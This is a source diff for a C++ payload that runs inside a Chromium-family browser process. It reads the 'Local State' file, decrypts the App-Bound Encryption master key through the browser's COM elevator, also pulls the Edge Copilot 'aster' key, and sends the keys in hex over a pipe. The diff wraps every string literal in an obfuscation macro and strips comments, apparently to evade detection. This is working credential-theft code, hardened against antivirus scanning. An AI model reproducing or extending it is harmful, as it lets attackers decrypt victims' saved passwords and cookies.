@@ -2,6 +2,7 @@
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 
 #include "../core/common.hpp"
+#include "../core/obfuscate.hpp"
 #include "../sys/bootstrap.hpp"
 #include "../sys/internal_api.hpp"
 #include "pipe_client.hpp"
@@ -23,7 +24,7 @@ struct ThreadParams {
 std::vector<uint8_t> GetEncryptedKeyByName(const std::filesystem::path& localState, const std::string& keyName, std::string* errorMsg = nullptr) {
     std::ifstream f(localState, std::ios::binary);
     if (!f) {
-        if (errorMsg) *errorMsg = "Cannot open Local State";
+        if (errorMsg) *errorMsg = OBF("Cannot open Local State").c_str();
         return {};
     }
 
@@ -32,14 +33,14 @@ std::vector<uint8_t> GetEncryptedKeyByName(const std::filesystem::path& localSta
     std::string tag = "\"" + keyName + "\":\"";
     size_t pos = content.find(tag);
     if (pos == std::string::npos) {
-        if (errorMsg) *errorMsg = "Key not found: " + keyName;
+        if (errorMsg) *errorMsg = std::string(OBF("Key not found: ").c_str()) + keyName;
         return {};
     }
 
     pos += tag.length();
     size_t end = content.find('"', pos);
     if (end == std::string::npos) {
-        if (errorMsg) *errorMsg = "Malformed JSON";
+        if (errorMsg) *errorMsg = OBF("Malformed JSON").c_str();
         return {};
     }
 
@@ -48,7 +49,7 @@ std::vector<uint8_t> GetEncryptedKeyByName(const std::filesystem::path& localSta
     DWORD size = 0;
     CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr);
     if (size < 5) {
-        if (errorMsg) *errorMsg = "Invalid key data (too small)";
+        if (errorMsg) *errorMsg = OBF("Invalid key data (too small)").c_str();
         return {};
     }
 
@@ -61,10 +62,12 @@ std::vector<uint8_t> GetEncryptedKeyByName(const std::filesystem::path& localSta
 
 std::string KeyToHex(const std::vector<uint8_t>& key) {
     std::string hex;
-    for (auto b : key) {
+    auto it = key.cbegin();
+    while (it != key.cend()) {
         char buf[3];
-        sprintf_s(buf, "%02X", b);
+        sprintf_s(buf, "%02X", *it);
         hex += buf;
+        ++it;
     }
     return hex;
 }
@@ -85,24 +88,21 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
             auto config = pipe.ReadConfig();
             auto browser = GetConfigs().at(config.browserType);
 
-            pipe.LogDebug("Running in " + browser.name);
+            pipe.LogDebug(std::string(OBF("Running in ").c_str()) + browser.name);
 
-            // Initialize syscalls
             if (!Sys::InitApi(config.verbose)) {
-                pipe.LogDebug("Warning: Syscall initialization failed.");
+                pipe.LogDebug(OBF("Warning: Syscall initialization failed.").c_str());
             }
 
-            // Get ABE key - this tool only works with App-Bound Encryption
             std::string error;
-            auto encKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", "app_bound_encrypted_key", &error);
+            auto encKey = GetEncryptedKeyByName(browser.userDataPath / OBF("Local State").c_str(), OBF("app_bound_encrypted_key").c_str(), &error);
 
             if (encKey.empty()) {
-                // Check if legacy DPAPI key exists
-                auto legacyKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", "encrypted_key");
+                auto legacyKey = GetEncryptedKeyByName(browser.userDataPath / OBF("Local State").c_str(), OBF("encrypted_key").c_str());
                 if (!legacyKey.empty()) {
-                    pipe.Log("NO_ABE:Browser uses legacy DPAPI encryption (App-Bound Encryption not enabled)");
+                    pipe.Log(std::string(OBF("NO_ABE:").c_str()) + OBF("Browser uses legacy DPAPI encryption (App-Bound Encryption not enabled)").c_str());
                 } else {
-                    pipe.Log("NO_ABE:No encryption key found in Local State");
+                    pipe.Log(std::string(OBF("NO_ABE:").c_str()) + OBF("No encryption key found in Local State").c_str());
                 }
                 // Exit gracefully - pipe destructor will send completion signal
             } else {
@@ -114,17 +114,15 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
                 masterKey = elevator.DecryptKey(encKey, browser.clsid, browser.iid, browser.iid_v2, browser.name == "Edge", browser.name == "Avast");
             }
 
-            // Send key as structured message
-            pipe.Log("KEY:" + KeyToHex(masterKey));
+            pipe.Log(std::string(OBF("KEY:").c_str()) + KeyToHex(masterKey));
 
-            // Extract Copilot key for Edge
             if (browser.name == "Edge") {
-                auto asterEncKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", "aster_app_bound_encrypted_key");
+                auto asterEncKey = GetEncryptedKeyByName(browser.userDataPath / OBF("Local State").c_str(), OBF("aster_app_bound_encrypted_key").c_str());
                 if (!asterEncKey.empty()) {
                     try {
                         Com::Elevator elevator;
                         auto asterKey = elevator.DecryptKeyEdgeIID(asterEncKey, browser.clsid, browser.iid);
-                        pipe.Log("ASTER_KEY:" + KeyToHex(asterKey));
+                        pipe.Log(std::string(OBF("ASTER_KEY:").c_str()) + KeyToHex(asterKey));
                     } catch (...) {
                         // Aster key decryption failed - silently continue
                     }
